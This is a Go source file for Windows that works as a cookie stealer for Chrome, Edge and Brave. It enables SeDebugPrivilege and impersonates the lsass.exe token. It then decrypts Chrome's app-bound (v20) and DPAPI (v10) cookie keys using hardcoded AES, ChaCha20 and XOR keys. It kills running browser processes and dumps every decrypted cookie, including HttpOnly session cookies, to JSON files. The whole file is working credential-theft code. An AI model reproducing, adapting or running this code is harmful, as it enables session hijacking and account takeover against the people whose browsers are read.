//go:build windows
// +build windows

package cookies

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/chacha20poly1305"
	"golang.org/x/sys/windows"
)

const (
	NCRYPT_SILENT_FLAG                = 0x40
	TOKEN_DUPLICATE                   = 0x0002
	TOKEN_IMPERSONATE                 = 0x0004
	TOKEN_QUERY                       = 0x0008
	TOKEN_ADJUST_PRIVILEGES           = 0x0020
	SE_PRIVILEGE_ENABLED              = 0x00000002
	SecurityImpersonation             = 2
	TokenImpersonation                = 2
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
)

var (
	modAdvapi32 = windows.NewLazySystemDLL("advapi32.dll")
	modCrypt32  = windows.NewLazySystemDLL("crypt32.dll")
	modNcrypt   = windows.NewLazySystemDLL("ncrypt.dll")

	procCryptUnprotectData        = modCrypt32.NewProc("CryptUnprotectData")
	procNCryptOpenStorageProvider = modNcrypt.NewProc("NCryptOpenStorageProvider")
	procNCryptOpenKey             = modNcrypt.NewProc("NCryptOpenKey")
	procNCryptDecrypt             = modNcrypt.NewProc("NCryptDecrypt")
	procNCryptFreeObject          = modNcrypt.NewProc("NCryptFreeObject")
	procOpenProcessToken          = modAdvapi32.NewProc("OpenProcessToken")
	procDuplicateTokenEx          = modAdvapi32.NewProc("DuplicateTokenEx")
	procImpersonateLoggedOnUser   = modAdvapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf              = modAdvapi32.NewProc("RevertToSelf")
	procLookupPrivilegeValueW     = modAdvapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges     = modAdvapi32.NewProc("AdjustTokenPrivileges")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

type ParsedKeyBlob struct {
	Header          []byte
	Flag            byte
	EncryptedAESKey []byte
	IV              []byte
	Ciphertext      []byte
	Tag             []byte
}

type Cookie struct {
	Host           string `json:"host"`
	Name           string `json:"name"`
	Value          string `json:"value"`
	Path           string `json:"path"`
	ExpiresUTC     int64  `json:"expires_utc"`
	IsSecure       bool   `json:"is_secure"`
	IsHttpOnly     bool   `json:"is_httponly"`
	SameSite       int    `json:"same_site"`
	Priority       int    `json:"priority"`
	CreationUTC    int64  `json:"creation_utc"`
	LastAccessUTC  int64  `json:"last_access_utc"`
	ExpiryDate     string `json:"expiry_date,omitempty"`
	CreationDate   string `json:"creation_date,omitempty"`
	LastAccessDate string `json:"last_access_date,omitempty"`
}

type ProfileData struct {
	ProfileName   string              `json:"profile_name"`
	ProfilePath   string              `json:"profile_path"`
	TotalCookies  int                 `json:"total_cookies"`
	TotalDomains  int                 `json:"total_domains"`
	CookiesByHost map[string][]Cookie `json:"cookies_by_host"`
	AllCookies    []Cookie            `json:"all_cookies"`
}

type BrowserData struct {
	BrowserName string                 `json:"browser_name"`
	BrowserPath string                 `json:"browser_path"`
	Profiles    map[string]ProfileData `json:"profiles"`
}

type ExtractionResult struct {
	ExtractedAt   string                 `json:"extracted_at"`
	TotalCookies  int                    `json:"total_cookies"`
	TotalProfiles int                    `json:"total_profiles"`
	Browsers      map[string]BrowserData `json:"browsers"`
}

type BrowserConfig struct {
	Name           string
	ProcessNames   []string
	UserDataPath   string
	LocalStatePath string
}

// ====== Basic helpers ======

func isAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	token := windows.Token(0)
	member, err := token.IsMember(sid)
	if err != nil {
		return false
	}
	return member
}

func enablePrivilege(privilegeName string) error {
	var token windows.Token
	proc, err := windows.GetCurrentProcess()
	if err != nil {
		return err
	}

	err = windows.OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &token)
	if err != nil {
		return err
	}
	defer token.Close()

	var luid LUID
	privName, err := syscall.UTF16PtrFromString(privilegeName)
	if err != nil {
		return err
	}

	ret, _, lastErr := procLookupPrivilegeValueW.Call(
		0,
		uintptr(unsafe.Pointer(privName)),
		uintptr(unsafe.Pointer(&luid)),
	)
	if ret == 0 {
		return fmt.Errorf("LookupPrivilegeValue failed: %v", lastErr)
	}

	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges: [1]LUID_AND_ATTRIBUTES{
			{
				Luid:       luid,
				Attributes: SE_PRIVILEGE_ENABLED,
			},
		},
	}

	ret, _, lastErr = procAdjustTokenPrivileges.Call(
		uintptr(token),
		0,
		uintptr(unsafe.Pointer(&tp)),
		0,
		0,
		0,
	)
	if ret == 0 {
		return fmt.Errorf("AdjustTokenPrivileges failed: %v", lastErr)
	}

	return nil
}

func getLsassPID() (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var procEntry windows.ProcessEntry32
	procEntry.Size = uint32(unsafe.Sizeof(procEntry))

	err = windows.Process32First(snapshot, &procEntry)
	if err != nil {
		return 0, err
	}

	for {
		exeFile := windows.UTF16ToString(procEntry.ExeFile[:])
		if exeFile == "lsass.exe" {
			return procEntry.ProcessID, nil
		}

		err = windows.Process32Next(snapshot, &procEntry)
		if err != nil {
			break
		}
	}

	return 0, fmt.Errorf("lsass.exe not found")
}

func impersonateLsass(fn func() error) error {
	err := enablePrivilege("SeDebugPrivilege")
	if err != nil {
		return fmt.Errorf("failed to enable SeDebugPrivilege: %v", err)
	}

	pid, err := getLsassPID()
	if err != nil {
		return err
	}

	hProcess, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	var hToken windows.Token
	ret, _, lastErr := procOpenProcessToken.Call(
		uintptr(hProcess),
		uintptr(TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY),
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret == 0 {
		return fmt.Errorf("OpenProcessToken failed: %v", lastErr)
	}
	defer hToken.Close()

	var hDupToken windows.Token
	ret, _, lastErr = procDuplicateTokenEx.Call(
		uintptr(hToken),
		uintptr(TOKEN_IMPERSONATE|TOKEN_QUERY),
		0,
		uintptr(SecurityImpersonation),
		uintptr(TokenImpersonation),
		uintptr(unsafe.Pointer(&hDupToken)),
	)
	if ret == 0 {
		return fmt.Errorf("DuplicateTokenEx failed: %v", lastErr)
	}
	defer hDupToken.Close()

	ret, _, lastErr = procImpersonateLoggedOnUser.Call(uintptr(hDupToken))
	if ret == 0 {
		return fmt.Errorf("ImpersonateLoggedOnUser failed: %v", lastErr)
	}

	funcErr := fn()
	procRevertToSelf.Call()

	return funcErr
}

func cryptUnprotectData(encryptedData []byte) ([]byte, error) {
	var inBlob DATA_BLOB
	var outBlob DATA_BLOB

	if len(encryptedData) > 0 {
		inBlob.pbData = &encryptedData[0]
		inBlob.cbData = uint32(len(encryptedData))
	}

	ret, _, _ := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0,
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed")
	}

	defer windows.LocalFree(windows.Handle(unsafe.Pointer(outBlob.pbData)))

	decrypted := make([]byte, outBlob.cbData)
	copy(decrypted, unsafe.Slice(outBlob.pbData, outBlob.cbData))

	return decrypted, nil
}

func decryptWithCNG(inputData []byte) ([]byte, error) {
	var hProvider uintptr
	providerName, _ := syscall.UTF16PtrFromString("Microsoft Software Key Storage Provider")

	ret, _, _ := procNCryptOpenStorageProvider.Call(
		uintptr(unsafe.Pointer(&hProvider)),
		uintptr(unsafe.Pointer(providerName)),
		0,
	)
	if ret != 0 {
		return nil, fmt.Errorf("NCryptOpenStorageProvider failed: 0x%x", ret)
	}
	defer procNCryptFreeObject.Call(hProvider)

	var hKey uintptr
	keyName, _ := syscall.UTF16PtrFromString("Google Chromekey1")

	ret, _, _ = procNCryptOpenKey.Call(
		hProvider,
		uintptr(unsafe.Pointer(&hKey)),
		uintptr(unsafe.Pointer(keyName)),
		0,
		0,
	)
	if ret != 0 {
		return nil, fmt.Errorf("NCryptOpenKey failed: 0x%x", ret)
	}
	defer procNCryptFreeObject.Call(hKey)

	var pcbResult uint32
	ret, _, _ = procNCryptDecrypt.Call(
		hKey,
		uintptr(unsafe.Pointer(&inputData[0])),
		uintptr(len(inputData)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&pcbResult)),
		NCRYPT_SILENT_FLAG,
	)
	if ret != 0 {
		return nil, fmt.Errorf("NCryptDecrypt (size query) failed: 0x%x", ret)
	}

	outputBuffer := make([]byte, pcbResult)
	ret, _, _ = procNCryptDecrypt.Call(
		hKey,
		uintptr(unsafe.Pointer(&inputData[0])),
		uintptr(len(inputData)),
		0,
		uintptr(unsafe.Pointer(&outputBuffer[0])),
		uintptr(pcbResult),
		uintptr(unsafe.Pointer(&pcbResult)),
		NCRYPT_SILENT_FLAG,
	)
	if ret != 0 {
		return nil, fmt.Errorf("NCryptDecrypt failed: 0x%x", ret)
	}

	return outputBuffer[:pcbResult], nil
}

func parseKeyBlob(blobData []byte) (*ParsedKeyBlob, error) {
	buffer := bytes.NewReader(blobData)
	parsed := &ParsedKeyBlob{}

	var headerLen uint32
	if err := binary.Read(buffer, binary.LittleEndian, &headerLen); err != nil {
		return nil, err
	}

	parsed.Header = make([]byte, headerLen)
	if _, err := io.ReadFull(buffer, parsed.Header); err != nil {
		return nil, err
	}

	var contentLen uint32
	if err := binary.Read(buffer, binary.LittleEndian, &contentLen); err != nil {
		return nil, err
	}

	flagByte := make([]byte, 1)
	if _, err := buffer.Read(flagByte); err != nil {
		return nil, err
	}
	parsed.Flag = flagByte[0]

	if parsed.Flag == 1 || parsed.Flag == 2 {
		parsed.IV = make([]byte, 12)
		parsed.Ciphertext = make([]byte, 32)
		parsed.Tag = make([]byte, 16)

		io.ReadFull(buffer, parsed.IV)
		io.ReadFull(buffer, parsed.Ciphertext)
		io.ReadFull(buffer, parsed.Tag)
	} else if parsed.Flag == 3 {
		parsed.EncryptedAESKey = make([]byte, 32)
		parsed.IV = make([]byte, 12)
		parsed.Ciphertext = make([]byte, 32)
		parsed.Tag = make([]byte, 16)

		io.ReadFull(buffer, parsed.EncryptedAESKey)
		io.ReadFull(buffer, parsed.IV)
		io.ReadFull(buffer, parsed.Ciphertext)
		io.ReadFull(buffer, parsed.Tag)
	} else {
		return nil, fmt.Errorf("unsupported flag: %d", parsed.Flag)
	}

	return parsed, nil
}

func byteXor(a, b []byte) []byte {
	result := make([]byte, len(a))
	for i := range a {
		result[i] = a[i] ^ b[i]
	}
	return result
}

func deriveV20MasterKey(parsed *ParsedKeyBlob) ([]byte, error) {
	var plaintext []byte

	if parsed.Flag == 1 {
		aesKey, _ := hex.DecodeString("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
		block, err := aes.NewCipher(aesKey)
		if err != nil {
			return nil, err
		}
		aesgcm, err := cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}
		plaintext, err = aesgcm.Open(nil, parsed.IV, append(parsed.Ciphertext, parsed.Tag...), nil)
		if err != nil {
			return nil, err
		}
	} else if parsed.Flag == 2 {
		chacha20Key, _ := hex.DecodeString("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
		aead, err := chacha20poly1305.New(chacha20Key)
		if err != nil {
			return nil, err
		}
		plaintext, err = aead.Open(nil, parsed.IV, append(parsed.Ciphertext, parsed.Tag...), nil)
		if err != nil {
			return nil, err
		}
	} else if parsed.Flag == 3 {
		xorKey, _ := hex.DecodeString("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
		var decryptedAESKey []byte
		err := impersonateLsass(func() error {
			var e error
			decryptedAESKey, e = decryptWithCNG(parsed.EncryptedAESKey)
			return e
		})
		if err != nil {
			return nil, err
		}

		xoredAESKey := byteXor(decryptedAESKey, xorKey)
		block, err := aes.NewCipher(xoredAESKey)
		if err != nil {
			return nil, err
		}
		aesgcm, err := cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}
		plaintext, err = aesgcm.Open(nil, parsed.IV, append(parsed.Ciphertext, parsed.Tag...), nil)
		if err != nil {
			return nil, err
		}
	}

	return plaintext, nil
}

func decryptCookieV20(encryptedValue []byte, v20MasterKey []byte) (string, error) {
	if len(encryptedValue) < 3+12+16 {
		return "", fmt.Errorf("encrypted value too short")
	}

	cookieIV := encryptedValue[3 : 3+12]
	encryptedCookie := encryptedValue[3+12 : len(encryptedValue)-16]
	cookieTag := encryptedValue[len(encryptedValue)-16:]

	block, err := aes.NewCipher(v20MasterKey)
	if err != nil {
		return "", err
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	decrypted, err := aesgcm.Open(nil, cookieIV, append(encryptedCookie, cookieTag...), nil)
	if err != nil {
		return "", err
	}

	if len(decrypted) < 32 {
		return "", fmt.Errorf("decrypted cookie too short")
	}

	return string(decrypted[32:]), nil
}

func decryptCookieV10(encryptedValue []byte, masterKey []byte) (string, error) {
	if len(encryptedValue) < 3+12+16 {
		return "", fmt.Errorf("encrypted value too short")
	}

	iv := encryptedValue[3:15]
	ciphertext := encryptedValue[15:]

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", err
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	decrypted, err := aesgcm.Open(nil, iv, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(decrypted), nil
}

func killBrowserProcesses(processNames []string) error {
	if len(processNames) == 0 {
		return nil
	}

	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(snapshot)

	var procEntry windows.ProcessEntry32
	procEntry.Size = uint32(unsafe.Sizeof(procEntry))

	err = windows.Process32First(snapshot, &procEntry)
	if err != nil {
		return err
	}

	killedCount := 0
	for {
		exeFile := windows.UTF16ToString(procEntry.ExeFile[:])

		for _, procName := range processNames {
			if strings.EqualFold(exeFile, procName) {
				hProcess, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, procEntry.ProcessID)
				if err == nil {
					windows.TerminateProcess(hProcess, 0)
					windows.CloseHandle(hProcess)
					killedCount++
				}
				break
			}
		}

		err = windows.Process32Next(snapshot, &procEntry)
		if err != nil {
			break
		}
	}

	if killedCount > 0 {
		fmt.Printf("    Stopped %d process(es), waiting for cleanup...\n", killedCount)
		time.Sleep(3 * time.Second)
	}

	return nil
}

func copyFileWithRetry(src, dst string, maxRetries int) error {
	var lastErr error

	for attempt := 0; attempt < maxRetries; attempt++ {
		if attempt > 0 {
			time.Sleep(1 * time.Second)
		}

		input, err := os.ReadFile(src)
		if err == nil {
			err = os.WriteFile(dst, input, 0644)
			if err == nil {
				return nil
			}
			lastErr = err
		} else {
			lastErr = err
		}
	}

	return fmt.Errorf("failed after %d attempts: %v", maxRetries, lastErr)
}

func chromeTimeToUnix(chromeTime int64) int64 {
	if chromeTime == 0 {
		return 0
	}
	const epochDelta = 11644473600
	return (chromeTime / 1000000) - epochDelta
}

func formatTimestamp(unixTime int64) string {
	if unixTime <= 0 {
		return "Never"
	}
	t := time.Unix(unixTime, 0)
	return t.Format("2006-01-02 15:04:05 MST")
}

func findProfiles(userDataPath string) ([]string, error) {
	profiles := []string{"Default"}

	entries, err := os.ReadDir(userDataPath)
	if err != nil {
		return profiles, nil
	}

	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
			profiles = append(profiles, entry.Name())
		}
	}

	return profiles, nil
}

func getMasterKey(localStatePath string) ([]byte, error) {
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	var localState map[string]interface{}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil, err
	}

	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return nil, fmt.Errorf("os_crypt not found")
	}

	// 1) Try Chrome/Edge v20 app-bound key via KeyBlob logic
	if appBoundKey, ok := osCrypt["app_bound_encrypted_key"].(string); ok {
		keyBlobEncrypted, err := base64.StdEncoding.DecodeString(appBoundKey)
		if err == nil && bytes.HasPrefix(keyBlobEncrypted, []byte("APPB")) {
			// Strip "APPB"
			keyBlobEncrypted = keyBlobEncrypted[4:]

			var keyBlobSystemDecrypted []byte
			err = impersonateLsass(func() error {
				var e error
				keyBlobSystemDecrypted, e = cryptUnprotectData(keyBlobEncrypted)
				return e
			})
			if err == nil {
				keyBlobUserDecrypted, err := cryptUnprotectData(keyBlobSystemDecrypted)
				if err == nil {
					// Try structured KeyBlob (Chrome 127+ style)
					if parsed, perr := parseKeyBlob(keyBlobUserDecrypted); perr == nil {
						if v20Key, derr := deriveV20MasterKey(parsed); derr == nil && len(v20Key) >= 32 {
							return v20Key, nil
						}
					}
					// Fallback: old behavior (raw key at end)
					if len(keyBlobUserDecrypted) >= 32 {
						return keyBlobUserDecrypted[len(keyBlobUserDecrypted)-32:], nil
					}
				}
			}
		}
	}

	// 2) Fallback to classic v10 DPAPI-encrypted key
	if encryptedKey, ok := osCrypt["encrypted_key"].(string); ok {
		keyEncrypted, err := base64.StdEncoding.DecodeString(encryptedKey)
		if err == nil && bytes.HasPrefix(keyEncrypted, []byte("DPAPI")) {
			keyEncrypted = keyEncrypted[5:]
			keyDecrypted, err := cryptUnprotectData(keyEncrypted)
			if err == nil {
				return keyDecrypted, nil
			}
		}
	}

	return nil, fmt.Errorf("failed to decrypt master key (no usable app_bound_encrypted_key or encrypted_key)")
}

func extractCookiesFromProfile(profilePath string, masterKey []byte) (ProfileData, error) {
	cookieDBPath := filepath.Join(profilePath, "Network", "Cookies")

	tempDir := os.TempDir()
	tempCookiePath := filepath.Join(tempDir, fmt.Sprintf("cookies_%d.db", time.Now().UnixNano()))
	defer os.Remove(tempCookiePath)

	err := copyFileWithRetry(cookieDBPath, tempCookiePath, 5)
	if err != nil {
		return ProfileData{}, err
	}

	db, err := sql.Open("sqlite3", tempCookiePath)
	if err != nil {
		return ProfileData{}, err
	}
	defer db.Close()

	rows, err := db.Query(`
		SELECT host_key, name, value, encrypted_value, path, expires_utc, 
		       is_secure, is_httponly, samesite, priority, 
		       creation_utc, last_access_utc
		FROM cookies
	`)
	if err != nil {
		return ProfileData{}, err
	}
	defer rows.Close()

	profileData := ProfileData{
		ProfileName:   filepath.Base(profilePath),
		ProfilePath:   profilePath,
		CookiesByHost: make(map[string][]Cookie),
		AllCookies:    []Cookie{},
	}

	successCount := 0
	failCount := 0
	emptyCount := 0

	for rows.Next() {
		var hostKey, name, path string
		var value string
		var encryptedValue []byte
		var expiresUTC, creationUTC, lastAccessUTC int64
		var isSecure, isHttpOnly bool
		var sameSite, priority int

		err := rows.Scan(&hostKey, &name, &value, &encryptedValue, &path, &expiresUTC,
			&isSecure, &isHttpOnly, &sameSite, &priority,
			&creationUTC, &lastAccessUTC)
		if err != nil {
			continue
		}

		var decrypted string
		var decErr error

		if len(encryptedValue) > 0 {
			if bytes.HasPrefix(encryptedValue, []byte("v20")) {
				decrypted, decErr = decryptCookieV20(encryptedValue, masterKey)
				if decErr != nil {
					failCount++
				} else {
					successCount++
				}
			} else if bytes.HasPrefix(encryptedValue, []byte("v10")) {
				decrypted, decErr = decryptCookieV10(encryptedValue, masterKey)
				if decErr != nil {
					failCount++
				} else {
					successCount++
				}
			} else {
				var raw []byte
				raw, decErr = cryptUnprotectData(encryptedValue)
				if decErr == nil {
					decrypted = string(raw)
					successCount++
				} else {
					failCount++
				}
			}
		} else {
			decrypted = value
			if value == "" {
				emptyCount++
			} else {
				successCount++
			}
		}

		if decErr != nil || decrypted == "" {
			continue
		}

		cookie := Cookie{
			Host:           hostKey,
			Name:           name,
			Value:          decrypted,
			Path:           path,
			ExpiresUTC:     expiresUTC,
			IsSecure:       isSecure,
			IsHttpOnly:     isHttpOnly,
			SameSite:       sameSite,
			Priority:       priority,
			CreationUTC:    creationUTC,
			LastAccessUTC:  lastAccessUTC,
			ExpiryDate:     formatTimestamp(chromeTimeToUnix(expiresUTC)),
			CreationDate:   formatTimestamp(chromeTimeToUnix(creationUTC)),
			LastAccessDate: formatTimestamp(chromeTimeToUnix(lastAccessUTC)),
		}

		profileData.AllCookies = append(profileData.AllCookies, cookie)
		profileData.CookiesByHost[hostKey] = append(profileData.CookiesByHost[hostKey], cookie)
	}

	if successCount == 0 {
		_ = failCount
		_ = emptyCount
		return profileData, fmt.Errorf("no decryptable cookies")
	}

	profileData.TotalCookies = len(profileData.AllCookies)
	profileData.TotalDomains = len(profileData.CookiesByHost)

	return profileData, nil
}

func extractBrowserCookies(config BrowserConfig) (BrowserData, error) {
	browserData := BrowserData{
		BrowserName: config.Name,
		BrowserPath: config.UserDataPath,
		Profiles:    make(map[string]ProfileData),
	}

	if _, err := os.Stat(config.UserDataPath); os.IsNotExist(err) {
		return browserData, fmt.Errorf("browser not found at %s", config.UserDataPath)
	}

	fmt.Printf(">>> %s\n", config.Name)
	fmt.Printf("  → Processing %s...\n", config.Name)

	_ = killBrowserProcesses(config.ProcessNames)

	masterKey, err := getMasterKey(config.LocalStatePath)
	if err != nil {
		return browserData, fmt.Errorf("failed to get master key: %v", err)
	}

	profiles, err := findProfiles(config.UserDataPath)
	if err != nil {
		return browserData, err
	}

	fmt.Printf("    Found %d profile(s)\n", len(profiles))

	for _, profileName := range profiles {
		profilePath := filepath.Join(config.UserDataPath, profileName)

		profileData, err := extractCookiesFromProfile(profilePath, masterKey)
		if err != nil || profileData.TotalCookies == 0 {
			fmt.Printf("    ⚠ Skipping profile '%s' (no decryptable cookies)\n", profileName)
			continue
		}

		browserData.Profiles[profileName] = profileData
		fmt.Printf("    ✓ %s: %d cookies from %d domains\n", profileName, profileData.TotalCookies, profileData.TotalDomains)
	}

	return browserData, nil
}

func browserSlug(name string) string {
	switch name {
	case "Google Chrome":
		return "chrome"
	case "Microsoft Edge":
		return "edge"
	default:
		s := strings.ToLower(name)
		s = strings.ReplaceAll(s, " ", "_")
		return s
	}
}

// Run is the entry point used by cmd/main.go
func Run() {
	if !isAdmin() {
		fmt.Println("[cookies] This extractor needs to run as administrator. Skipping cookies extraction.")
		return
	}

	localAppData := os.Getenv("LOCALAPPDATA")
	baseDir := filepath.Join("results", "chromium")

	browsers := []BrowserConfig{
		{
			Name: "Google Chrome",
			ProcessNames: []string{
				"chrome.exe",
				"chrome_pwa_launcher.exe",
			},
			UserDataPath:   filepath.Join(localAppData, "Google", "Chrome", "User Data"),
			LocalStatePath: filepath.Join(localAppData, "Google", "Chrome", "User Data", "Local State"),
		},
		{
			Name: "Microsoft Edge",
			ProcessNames: []string{
				"msedge.exe",
				"msedgewebview2.exe",
				"MicrosoftEdgeUpdate.exe",
				"identity_helper.exe",
				"msedge_proxy.exe",
			},
			UserDataPath:   filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
			LocalStatePath: filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Local State"),
		},
		{
			Name: "Brave Browser",
			ProcessNames: []string{
				"brave.exe",
			},
			UserDataPath:   filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data"),
			LocalStatePath: filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
		},
	}

	result := ExtractionResult{
		ExtractedAt:   time.Now().Format(time.RFC3339),
		Browsers:      make(map[string]BrowserData),
		TotalCookies:  0,
		TotalProfiles: 0,
	}

	if err := os.MkdirAll(baseDir, 0755); err != nil {
		fmt.Printf("[cookies] Failed to create base results dir %s: %v\n", baseDir, err)
		return
	}

	for _, cfg := range browsers {
		bData, err := extractBrowserCookies(cfg)
		if err != nil {
			fmt.Printf("[cookies] ⚠ Skipping %s: %v\n\n", cfg.Name, err)
			continue
		}
		if len(bData.Profiles) == 0 {
			fmt.Printf("[cookies] ⚠ No profiles with decryptable cookies for %s\n\n", cfg.Name)
			continue
		}

		result.Browsers[cfg.Name] = bData

		for _, p := range bData.Profiles {
			result.TotalProfiles++
			result.TotalCookies += p.TotalCookies
		}
		fmt.Println()
	}

	// Write only per-browser and per-profile cookies.json
	for bName, bData := range result.Browsers {
		slug := browserSlug(bName)
		browserDir := filepath.Join(baseDir, slug)

		if err := os.MkdirAll(browserDir, 0755); err != nil {
			fmt.Printf("[cookies] Failed to create browser dir %s: %v\n", browserDir, err)
			continue
		}

		for pName, pData := range bData.Profiles {
			profileDir := filepath.Join(browserDir, pName)

			if err := os.MkdirAll(profileDir, 0755); err != nil {
				fmt.Printf("[cookies] Failed to create profile dir %s: %v\n", profileDir, err)
				continue
			}

			pJSON, err := json.MarshalIndent(pData, "", "  ")
			if err != nil {
				fmt.Printf("[cookies] Failed to marshal profile %s for %s: %v\n", pName, bName, err)
				continue
			}

			cookieFile := filepath.Join(profileDir, "cookies.json")
			if err := os.WriteFile(cookieFile, pJSON, 0644); err != nil {
				fmt.Printf("[cookies] Failed to write %s: %v\n", cookieFile, err)
				continue
			}
		}
	}

	fmt.Println("[cookies] ✅ Cookies extraction complete!")
	fmt.Printf("[cookies]   Profiles extracted: %d\n", result.TotalProfiles)
	fmt.Printf("[cookies]   Total cookies extracted: %d\n", result.TotalCookies)
	fmt.Printf("[cookies]   Output saved under: %s\n", baseDir)
}
